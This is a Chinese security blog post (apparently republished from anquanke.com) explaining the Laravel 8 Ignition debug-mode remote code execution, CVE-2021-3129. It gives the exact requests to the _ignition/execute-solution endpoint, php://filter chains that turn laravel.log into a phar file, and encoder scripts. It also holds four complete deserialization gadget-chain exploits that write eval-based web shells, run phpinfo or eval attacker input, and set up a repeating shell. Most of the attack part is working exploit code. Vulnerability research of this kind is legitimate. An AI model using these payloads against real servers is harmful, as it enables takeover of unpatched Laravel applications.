> 原文链接: https://www.anquanke.com//post/id/235228 


# Laravel 8  Debug mode RCE 汇总


                                阅读量   
                                **179507**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t019694f3612ee6ef02.png)](https://p2.ssl.qhimg.com/t019694f3612ee6ef02.png)



环境配置
- PHP: 7.3.4
- Laravel：8.32.1
影响版本
- Laravel &lt; 8.4.3
- Facade Ignition &lt; 2.5.2
环境搭建: `composer create-project --prefer-dist laravel/laravel laravel822 "8.2.*"` , 如果用到了未默认带的组件会在文中说明 !

通过 php artisan serve 启动服务



## CVE-2021-3129

经典的 laravel8.22 反序列化漏洞, 发生在`Ignition`（&lt;=2.5.1）中，口子在 `index.php/_ignition/execute-solution`, `Ignition`默认提供了以下几个solutions

[![](https://p1.ssl.qhimg.com/t01cf2cf99ad275db39.png)](https://p1.ssl.qhimg.com/t01cf2cf99ad275db39.png)

本次漏洞就是其中 `vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php` 过滤不严谨导致的, 先找到执行 solution 的php文件, 全局搜索 ExecuteSolutionController

```
&lt;?php

namespace Facade\Ignition\Http\Controllers;

use Facade\Ignition\Http\Requests\ExecuteSolutionRequest;
use Facade\IgnitionContracts\SolutionProviderRepository;
use Illuminate\Foundation\Validation\ValidatesRequests;

class ExecuteSolutionController
`{`
    use ValidatesRequests;

    public function __invoke(
        ExecuteSolutionRequest $request,
        SolutionProviderRepository $solutionProviderRepository
    ) `{`
        $solution = $request-&gt;getRunnableSolution();

        $solution-&gt;run($request-&gt;get('parameters', []));

        return response('');
    `}`
`}`
```

发现有 `__invoke()` 魔法函数, 然后跟进调用的是 run 方法, 并将可控的 `parameters` 传过去, 通过这个点我们可以调用到 `MakeViewVariableOptionalSolution::run()`

```
&lt;?php

namespace Facade\Ignition\Solutions;

use Facade\IgnitionContracts\RunnableSolution;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Str;

class MakeViewVariableOptionalSolution implements RunnableSolution `{`
    ...
    public function run(array $parameters = [])
    `{`
        $output = $this-&gt;makeOptional($parameters);
        if ($output !== false) `{`
            file_put_contents($parameters['viewFile'], $output);
        `}`
    `}`
    ...
`}`
```

然后跟进到 makeOptional 方法

```
public function makeOptional(array $parameters = [])
    `{`
        $originalContents = file_get_contents($parameters['viewFile']);
        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents));
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) `{`
            return false;
        `}`

        return $newContents;
    `}`
```

体现的功能就是替换 `$variableName` 为 `$variableName ?? ''` , 之后写回文件中

由于这里调用了`file_get_contents()`, 且其中的参数可控, 所以这里可以通过`phar://`协议去触发phar反序列化

**将log转化为phar文件**

原文作者给出的一个基于框架触发 phar反序列化的方法: 将log文件变成合法的phar文件

laravel 的 log 文件在 `/storage/logs/laravel.log`

```
[2021-03-14 03:47:21] production.ERROR: No application encryption key has been specified. `{`"exception":"[object] (Illuminate\\Encryption\\MissingAppKeyException(code: 0): No application encryption key has been specified. at D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php:79)
[stacktrace]
#0 D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Support\\helpers.php(263): Illuminate\\Encryption\\EncryptionServiceProvider-&gt;Illuminate\\Encryption\\`{`closure`}`(NULL)
#1 D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php(81): tap(NULL, Object(Closure))
#2
...
```

原文作者在文章中提出了使用 `php://filter` 中的 `convert.base64-decode` 过滤器的特性, 将log清空

&lt;img src=”https://p5.ssl.qhimg.com/t01bcf0f7e02d81fe40.png” style=”zoom:150%;” /&gt;

`convert.base64-decode` 会将一些非 base64 字符给过滤掉后再进行 `decode`, 所以可以通过调用多次 `convert.base64-decode` 来将 log 清空

&lt;img src=”https://p2.ssl.qhimg.com/t01884d4be108dc3977.png” style=”zoom:150%;” /&gt;

但是也会出现非预期的状况, 如果某次 base64 编码后的 `=` 出现了别的 base64 字符

&lt;img src=”https://p0.ssl.qhimg.com/t0145f977898a91bded.png” style=”zoom:150%;” /&gt;

php是会报一个 Warning 的, 且由于 laravel 开启了debug模式，所以会触发 `Ignition` 生成错误页面，导致decode后的字符没有成功写入

所以我们清空 log 文件的目录大致分为底下两步操作:
- 使 log 文件尽可能变成非 base64 字符
- 再通过 `convert.base64-decode` 将所有非 base64 字符清空
原文作者在第一步通过多次 `convert.base64-decode` , 但是有可能会出现上述的 Warning 状况, 例如取了一次真实的 laravel.log 进行多次 `convert.base64-decode` , php报了 Warning

[![](https://p0.ssl.qhimg.com/t01a4bc7b8be1e0284b.png)](https://p0.ssl.qhimg.com/t01a4bc7b8be1e0284b.png)

所以我们需要考虑另外一种方式达到第一步的目的, 我们知道 `php://filter` 还有很多解析器, 像是 `convert.base64-decode`, `string.rot13`, `string.strip_tags`, `convert.iconv.UCS-2LE.UCS-2BE`, `convert.iconv.utf-8.utf-7` 等, 这里我们使用 `convert.iconv.utf-8.utf-16be`

```
`{`"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": `{`"variableName": "username", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log"`}``}`
```

结果如下

[![](https://p4.ssl.qhimg.com/t011f4d154a3704591a.png)](https://p4.ssl.qhimg.com/t011f4d154a3704591a.png)

然后使用 `convert.quoted-printable-encode` 打印所有不可见的字符

[![](https://p5.ssl.qhimg.com/t01fd81184a2fcdb5a4.png)](https://p5.ssl.qhimg.com/t01fd81184a2fcdb5a4.png)

再使用 `convert.iconv.utf-16be.utf-8`

[![](https://p1.ssl.qhimg.com/t019d20527bb490971f.png)](https://p1.ssl.qhimg.com/t019d20527bb490971f.png)

这三部操作显而易见的将 log 文件内的字符变成了非 base64 字符, 这个时候再使用 `convert.base64-decode` 就可以成功清楚 log 文件

[![](https://p3.ssl.qhimg.com/t01254aa785a8036afb.png)](https://p3.ssl.qhimg.com/t01254aa785a8036afb.png)

那么我们把上述步骤合并起来就达成了这两步的目的

```
php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

```

实现了一步清空 log 文件

[![](https://p0.ssl.qhimg.com/t016e292c9b85cdc187.png)](https://p0.ssl.qhimg.com/t016e292c9b85cdc187.png)

**写入符合规范的phar文件**

我们可以通过 `file_get_contents` 去触发日志的记录, 也可以本地调试报错后在相关的文件夹找到 log 文件的记录

[![](https://p4.ssl.qhimg.com/t01ace629413c0ccebd.png)](https://p4.ssl.qhimg.com/t01ace629413c0ccebd.png)

通过观察, 可以发现 log 文件大致的格式

```
[时间]错误原因:错误发生的完整路径:错误发生的完整路径
[跟踪]#0...+部分payload+...
```

会发现我们 file_get_contents 的完整路径会出现两次

[![](https://p5.ssl.qhimg.com/t01c55053a1d6401fad.png)](https://p5.ssl.qhimg.com/t01c55053a1d6401fad.png)

最终需要让 log 文件变成恶意 phar 文件, 所以还得继续对 log 文件进行操作

原文作者给出的方式是 `convert.iconv.utf-16le.utf-8`

```
&lt;?php
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.iconv.utf-16le.utf-8');
    fwrite($fp, "R\0i\0c\0k\0y\0 \0u\0p\0l\0o\0a\0d\0 \0a\0 \0f\0i\0l\0e\0.\0\n\0");
    fclose($fp);
    /* Result: Ricky upload a file. */
?&gt;
```

然后测试一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0140f4f8115b535cd6.png)

我们可以再后一个 payload添加任意字符, 这样至少能有一个转义出来

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018d1e78aa7296b3fa.png)

这样子就是我们想要的效果, 因为除了 payload 的部分都是非 base64 字符, 只要我们将 payload 进行base64编码后再decode即可把非 base64 字符消除掉

但是这么做还会有一个问题，就是在 `file_get_contents()` 传入`\00` 的时候 php 会报一个 Warning, 同样会触发Debug页面的报错, 还需要想办法把空字节（`\00`）写入到 log 文件中

这个时候就可以使用 `convert.quoted-printable-encode`过滤器, 将不可见字符打印出来

```
&lt;?php
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.quoted-printable-encode');
    fwrite($fp, "P\0A\0Y\0L\0O\0A\0D\0");
    fclose($fp);
    /* Result: P=00A=00Y=00L=00O=00A=00D */
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.quoted-printable-decode');
    fwrite($fp, "P=00A=00Y=00L=00O=00A=00D=00");
    fclose($fp);
    /* Result: PAYLOAD */
?&gt;
```

[![](https://p2.ssl.qhimg.com/t019677438f74a72947.png)](https://p2.ssl.qhimg.com/t019677438f74a72947.png)

原理就是将字符转成ascii后前面加个`=`号, 将其打印出来, `convert.quoted-printable-decode` 则是将等号后面的 ascii 字符解码并打印出来, 于是我们可以用 **=00 代替 \00** 传入到 file_get_contents 当中, 完整调用的payload是这样的

```
php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

**易错点1**

如果直接根据作者给出的方式生成 PAYLOAD ，在到 `convert.quoted-printable-decode` 过滤器的时候可能会出问题

[![](https://p1.ssl.qhimg.com/t01bcb0e9dad8fd309e.png)](https://p1.ssl.qhimg.com/t01bcb0e9dad8fd309e.png)

把 `=` 改成 `=3D` 就不会出现此类问题

**易错点2**

我们生成的 PAYLOAD 会在 log 文件中完整出现两次以外, 还会在底下出现部分 PAYLOAD, 所以我们先将 PAYLOAD 进行一次 `convert.quoted-printable-encode`编码

**尝试写入log文件**

尝试报错后产生 log 文件, 然后一步清空

```
`{`"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": `{`"variableName": "username", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"`}``}`
```

给 log 文件加入前缀

```
"viewFile": "AA"
```

将需要写入的字符编码

```
# -*-coding:utf-8-*-
import base64
s = base64.b64encode(b'PAYLOAD').decode('utf-8')
r = ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
print(r)
# =55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00
```

清空干扰字符

```
"viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
```

[![](https://p4.ssl.qhimg.com/t01e5084afa39453864.png)](https://p4.ssl.qhimg.com/t01e5084afa39453864.png)

成功写入任意字符, 那 log 文件的内容我们就可控了



## POP链1

然后我们只需要完整利用, 拿自己之前挖的 payload 测试一下

```
&lt;?php

namespace Illuminate\Broadcasting `{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        `}`
    `}`
`}`

namespace Illuminate\Validation `{`
    class Validator `{`
        public $extensions;
        public function __construct($extensions)`{`
            $this-&gt;extensions = $extensions;
        `}`
    `}`
`}`

namespace Illuminate\Filesystem `{`
    class Filesystem`{`
        public $path = 'ricky.php';
        public $data = '&lt;?php eval($_POST[ricky]);?&gt;';
    `}`
`}`

namespace Illuminate\Auth `{`
    class RequestGuard `{`
        protected $user;
        protected $callback;
        protected $request = 'ricky.php';
        protected $provider = '&lt;?php eval($_POST[ricky]);?&gt;';
        public function __construct($callback) `{`
            $this-&gt;callback = $callback;
        `}`
    `}`
`}`

namespace `{`
    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Validation\Validator;
    use Illuminate\Broadcasting\PendingBroadcast;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new Validator(array(''=&gt;'call_user_func'));
    $a = new PendingBroadcast($b, [$c, 'user']);

    $phar = new Phar("phar.phar"); //生成phar文件
    $phar-&gt;startBuffering();
    $phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
    $phar-&gt;setMetadata($a); //触发头是C1e4r类
    $phar-&gt;addFromString("exp.txt", "test"); //生成签名
    $phar-&gt;stopBuffering();
`}`
```

生成 phar 文件再把里面的内容转为 base64 字符

[![](https://p1.ssl.qhimg.com/t013220f9b52056efd4.png)](https://p1.ssl.qhimg.com/t013220f9b52056efd4.png)

然后 python 转换

```
# -*-coding:utf-8-*-
import base64a
s = '你的base64的payload'
r = ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
print(r+'a')  # 因为后面有), 加入一个干扰字符会将我们的phar内容保留下来
```

然后先传入任意不存在文件报错 &gt; 生成 log 文件 &gt; 传入payload &gt; 执行清空 log 文件的步骤

最后我们 phar反序列化包含即可成功

[![](https://p2.ssl.qhimg.com/t017e1082cdebfd211d.png)](https://p2.ssl.qhimg.com/t017e1082cdebfd211d.png)



## POP链2

用 FileCookieJar 进行文件上传

```
&lt;?php

namespace`{`
    require "./autoload.php";  // 取决于你 exp.php 的存放位置
    $a = new \GuzzleHttp\Cookie\FileCookieJar("./ricky.php");
    $a-&gt;setCookie(new \GuzzleHttp\Cookie\SetCookie([
        'Name'=&gt;'ricky',
        'Domain'=&gt; "&lt;?php phpinfo();eval(\$_POST[ricky]);?&gt;",
        'Expires'=&gt;123,
        'Value'=&gt;123
    ]));

    $phar = new Phar("ricky2.phar"); //生成phar文件
    $phar-&gt;startBuffering();
    $phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
    $phar-&gt;setMetadata($a); //触发头是C1e4r类
    $phar-&gt;addFromString("test.txt", "test"); //生成签名
    $phar-&gt;stopBuffering();
`}`
```

按照上面的步骤执行 phar 反序列化在 public 目录下生成 shell, 即可执行

[![](https://p2.ssl.qhimg.com/t016a16c1f3382b0ec9.png)](https://p2.ssl.qhimg.com/t016a16c1f3382b0ec9.png)



## POP链3

尝试直接命令执行的类, 有之前就出现在 laravel5 反序列化中的 `EvalLoader` 类, 建立 phar 反序列化

```
&lt;?php

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Foundation\Console `{`
    class QueuedCommand
    `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver)`{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace Mockery\Loader `{`
    class EvalLoader `{`

    `}`
`}`

namespace Mockery\Generator `{`
    class MockDefinition `{`
        protected $code;
        protected $config;
        public function __construct($code, $config) `{`
            $this-&gt;code = $code;
            $this-&gt;config = $config;
        `}`
    `}`
    class MockConfiguration `{`
        protected $name = "ricky";
    `}`
`}`

namespace `{`
    $d = new Mockery\Generator\MockDefinition('&lt;?php phpinfo();exit()?&gt;', new Mockery\Generator\MockConfiguration());
    $c = new Illuminate\Foundation\Console\QueuedCommand($d);
    $b = new Illuminate\Bus\Dispatcher([new Mockery\Loader\EvalLoader(), 'load']);
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);

    $phar = new Phar("ricky3.phar"); //生成phar文件
    $phar-&gt;startBuffering();
    $phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
    $phar-&gt;setMetadata($a); //触发头是C1e4r类
    $phar-&gt;addFromString("test.txt", "test"); //生成签名
    $phar-&gt;stopBuffering();
`}`

```

然后依照上面的流程走一遍, 就可以达成命令执行的效果

[![](https://p5.ssl.qhimg.com/t01412d7d8b2cf14ad1.png)](https://p5.ssl.qhimg.com/t01412d7d8b2cf14ad1.png)



## POP链4

全局搜索 `__destruct()`, 常用的有很多, 像是 `PendingBroadcast` 类, `PendingResourceRegistration` 类还有 `ImportConfigurator` 类, 用于触发 `__call` 方法, 这次调用的是 Mock 类里面的 `generate()` 方法

```
# MockClass.php
    public function generate(): string
    `{`
        if (!class_exists($this-&gt;mockName, false)) `{`
            eval($this-&gt;classCode);  # $this-&gt;classCode 可控
            call_user_func(
                [
                    $this-&gt;mockName,
                    '__phpunit_initConfigurableMethods',
                ],
                ...$this-&gt;configurableMethods
            );
        `}`
        return $this-&gt;mockName;
    `}`
# MockTrait.php
    public function generate(): string
    `{`
        if (!class_exists($this-&gt;mockName, false)) `{`
            eval($this-&gt;classCode);
        `}`

        return $this-&gt;mockName;
    `}`
```

只需要使 `$mockName` 这个类不存在即可, 而且该参数可控, `$this-&gt;classCode` 也可控, 向上回溯找到调用 Mock 类的函数, 在 `Mockery/HigherOrderMessage.php` 的 `__call` 方法中

```
public function __call($method, $args)
    `{`
        if ($this-&gt;method === 'shouldNotHaveReceived') `{`
            return $this-&gt;mock-&gt;`{`$this-&gt;method`}`($method, $args);
        `}`

        $expectation = $this-&gt;mock-&gt;`{`$this-&gt;method`}`($method);  // 调用 mock 类
        return $expectation-&gt;withArgs($args);
    `}`
```

特别的凑巧, 我们也需要调用 `__call()` 方法, 所以一条 POP 链就形成了

```
class ImportConfigurator() -&gt; __destruct()
↓↓↓
class HigherOrderMessage() -&gt; __call()
↓↓↓
class MockClass() -&gt; generate() 或者 class MockTrait() -&gt; generate()

```

建立 exp.php, 生成 phar 文件调用 phpinfo

```
&lt;?php

namespace Symfony\Component\Routing\Loader\Configurator `{`
    class ImportConfigurator `{`
        private $parent;
        private $test;
        public function __construct($parent) `{`
            $this-&gt;parent = $parent;
            $this-&gt;test = 'undefined';
        `}`
    `}`
`}`

namespace Mockery `{`
    class HigherOrderMessage `{`
        private $mock;
        private $method;
        public function __construct($mock) `{`
            $this-&gt;mock = $mock;
            $this-&gt;method = 'generate';  // 调用 mock 类的 generate 方法
        `}`
    `}`
`}`

namespace PHPUnit\Framework\MockObject `{`
    class MockTrait `{`
        private $classCode;
        private $mockName;
        public function __construct($classCode) `{`
            $this-&gt;classCode = $classCode;
            $this-&gt;mockName = 'undefined';  // 控制 $mockname 为不存在的类
        `}`
    `}`
`}`

namespace `{`

    use Mockery\HigherOrderMessage;
    use PHPUnit\Framework\MockObject\MockTrait;
    use Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;

    $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; eval(filter_input(INPUT_GET,\"ricky\"));");
    $b = new HigherOrderMessage($c);
    $a = new ImportConfigurator($b);

    $phar = new Phar("ricky1.phar"); //生成phar文件
    $phar-&gt;startBuffering();
    $phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
    $phar-&gt;setMetadata($a); //触发头是C1e4r类
    $phar-&gt;addFromString("test.txt", "test"); //生成签名
    $phar-&gt;stopBuffering();
`}`
```

不过测试了一下, 高版本的 `ImportConfigurator` 类会返回 `Cannot unserialize` 的提示, 那我们就用 `PendingResourceRegistration` 类

```
&lt;?php

namespace Illuminate\Routing`{`
    class PendingResourceRegistration`{`
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;
        public function __construct($registrar, $name, $controller, $options)
        `{`
            $this-&gt;registrar = $registrar;
            $this-&gt;name = $name;
            $this-&gt;controller = $controller;
            $this-&gt;options = $options;
        `}`
    `}`
`}`

namespace Mockery `{`
    class HigherOrderMessage `{`
        private $mock;
        private $method;
        public function __construct($mock) `{`
            $this-&gt;mock = $mock;
            $this-&gt;method = 'generate';  // 调用 mock 类的 generate 方法
        `}`
    `}`
`}`

namespace PHPUnit\Framework\MockObject `{`
    class MockTrait `{`
        private $classCode;
        private $mockName;
        public function __construct($classCode) `{`
            $this-&gt;classCode = $classCode;
            $this-&gt;mockName = 'undefined';  // 控制 $mockname 为不存在的类
        `}`
    `}`
`}`

namespace `{`

    use Mockery\HigherOrderMessage;
    use PHPUnit\Framework\MockObject\MockTrait;
    use Illuminate\Routing\PendingResourceRegistration;

    $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; eval(filter_input(INPUT_GET,\"ricky\"));");
    $b = new HigherOrderMessage($c);
    $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');

    $phar = new Phar("ricky1.phar"); //生成phar文件
    $phar-&gt;startBuffering();
    $phar-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? &gt;');
    $phar-&gt;setMetadata($a); //触发头是C1e4r类
    $phar-&gt;addFromString("test.txt", "test"); //生成签名
    $phar-&gt;stopBuffering();
`}`
```

然后我们尝试建立一个新的 log 文件循环调用 phar 文件

```
$code = base64_encode(file_get_contents("./ricky1.phar"));
$c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; file_put_contents('/var/www/html/storage/logs/ricky.log',base64_decode('`{`$code`}`'));");
```

然后按照上面的步骤触发反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01275aa35bf815091f.png)

然后触发我们的另一个 log 文件进行 phar 反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012b7d031838602509.png)

这样就实现了循环调用的 shell

**疑点: phar完成转换后payload太长了能否截断上传?**

因为是 base64 字符, 首先至少要满足能被 4 整除, 然后再尝试上传拼接的 payload, 我就对了一个比较短的 exp 进行了二次分割上传, 发现截断应该是解码后产生了换行, 文件损坏了就无法执行 phar 反序列化了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012ceca5ff47f58e7a.png)

如果网站有字数上传限制的话那么可能就无法成功执行

最后再附上一个可以将payload直接转换后写入文档的文件, 制作好以后就可以直接生成payload

```
&lt;?php
function TransferPhar($file)`{`
    $endfile = fopen("phar.txt", "w");
    $raw = base64_encode(file_get_contents($file));
    $result = array();
    for($i = 0; $i &lt; strlen($raw); $i++)`{`
        $result[$i] = "=" . strtoupper(dechex(ord($raw[$i]))) . "=00";
    `}`
    fwrite($endfile, implode($result));
    fclose($endfile);
`}`
TransferPhar('./ricky.phar');
```



## 小结

总结一下:
- 第一步做的是建立 log 文件, 也就是使 `file_get_contents()` 读取文件报错得到 log 文件
- 第二步是清空 log 文件, 通过报错上传我们的payload, 然后就是经过多个过滤器的篡改得到 phar 文件
- 第三步是执行 phar 反序列化拿到shell
总体来说 laravel 反序列化考的还是对 POP 链的挖掘, 这次的 CVE 相当于多了一个无形的反序列化点, 多个过滤器配合过滤也是十分巧妙, 也算是进一步对 laravel 框架有了个全面的了解.

感谢各位读者可以耐心地读到这里, 希望您对该漏洞有了更深刻的认识, 可能有还没汇总全的, 希望各位师傅踊跃提出!
